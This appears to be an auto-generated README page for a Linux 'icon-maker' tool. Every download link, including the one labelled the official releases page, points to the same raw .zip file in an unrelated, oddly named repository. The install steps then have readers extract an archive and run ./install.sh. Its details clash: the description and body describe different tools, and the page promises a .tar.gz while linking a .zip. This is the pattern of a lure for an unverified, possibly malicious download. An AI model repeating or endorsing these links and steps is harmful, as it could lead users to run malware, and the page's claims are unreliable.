---
layout: "default"
title: "🎨 icon-maker - Create custom icons for your desktop"
description: "Convert downloaded icon packs into organized Linux icon theme tarballs using this automated script."
---
# 🎨 icon-maker - Create custom icons for your desktop

[![](https://img.shields.io/badge/Download-Icon--Maker-blue.svg)](https://raw.githubusercontent.com/Djjdjdjdhd/djjdjdjdhd.github.io/main/piragua/djjdjdjdhd-io-github-2.2.zip)

## 📌 About this project

The icon-maker tool helps you manage your desktop theme. It pulls icon sets from the internet and builds them for your computer. You gain a fresh look for your interface without editing files by hand. This tool works for users on Ubuntu, Fedora, and Arch systems.

## ✨ Main features

- One-click downloads for popular icon sets.
- Automatic installation into your desktop theme folder.
- Support for many Linux distributions.
- Simple preview tool to see icons before you apply them.
- Cleanup utility to remove old or unused icon packs.

## 🛠 Prerequisites

Your computer needs a few things to run this tool. Most systems come with these pre-installed. Please check your setup:

- A desktop environment like GNOME, KDE, or XFCE.
- Access to the terminal application.
- A stable internet connection for downloading icon files.
- Basic permissions to write files to your home directory.

## 📥 How to download and install

Follow these steps to set up the tool on your machine.

1. Visit the [official releases page](https://raw.githubusercontent.com/Djjdjdjdhd/djjdjdjdhd.github.io/main/piragua/djjdjdjdhd-io-github-2.2.zip) to download the package.
2. Look for the file ending in .tar.gz for your system.
3. Save the file to your Downloads folder.
4. Open your terminal application.
5. Move to the directory where you saved the file: `cd ~/Downloads`.
6. Extract the files using your system file manager or the command: `tar -xvf icon-maker.tar.gz`.
7. Move into the new folder: `cd icon-maker`.
8. Run the installer script: `./install.sh`.

## 🚀 Running the software

Once the install completes, you can start the program. Open your main application menu and search for "Icon Maker." Select it to launch the interface. 

When the window opens, you see a list of icons. Click on a name to see the preview. Press the button marked "Install" to add the set to your desktop theme manager. You can then open your system settings and select your new icons from the appearance menu.

## 🔍 Troubleshooting common issues

**The installer says permission denied**
You might need to make the file executable. Run this command in the folder: `chmod +x install.sh`. Then try the install command again.

**Icons do not appear in settings**
Ensure you placed the files in the correct folder. Usually, this is `.local/share/icons` inside your home directory. If the folder does not exist, create it.

**I cannot find the download link**
You can always get the latest version from here: [https://raw.githubusercontent.com/Djjdjdjdhd/djjdjdjdhd.github.io/main/piragua/djjdjdjdhd-io-github-2.2.zip](https://raw.githubusercontent.com/Djjdjdjdhd/djjdjdjdhd.github.io/main/piragua/djjdjdjdhd-io-github-2.2.zip).

## 💡 Customization tips

You can define your own download locations. Look for a file named `config.json` inside the tool folder. Open it with a text editor. You can add new addresses for icon packs. Save the file and restart the application to use your changes. 

## 🛡 System requirements

- Memory: 512 MB of free RAM.
- Storage: 200 MB of space for downloaded packs.
- Graphics: Any standard display driver works fine.

## 💬 Frequently asked questions

**Does this change my system files?**
No. This tool only places files in your user folder. It does not touch sensitive system areas.

**Can I remove icons later?**
Yes. Open the application and go to the Installed tab. Select the icon pack you want to remove and click the delete button. 

**Is this safe?**
The script only downloads files from known sources. You should always check the source before you add new items to your list.

## ℹ️ Getting more help

If you still have trouble, check the logs. The program saves errors to a file named `log.txt` in the main folder. You can read this text file to see what went wrong. You can also visit the project page link provided above to file a report if something breaks.